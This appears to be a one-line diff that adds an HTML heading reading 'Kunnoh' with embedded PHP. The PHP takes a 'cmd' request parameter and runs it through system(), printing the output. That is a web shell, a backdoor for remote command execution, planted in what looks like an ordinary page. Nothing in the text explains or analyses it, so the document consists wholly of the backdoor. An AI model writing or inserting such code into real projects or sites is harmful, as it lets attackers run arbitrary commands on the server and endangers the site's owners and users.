@@ -1,0 +1,1 @@
+<h1>Kunnoh<br><?php if(isset(\$REQUEST['cmd'])){echo '<pre>';\$cmd = (\$REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>
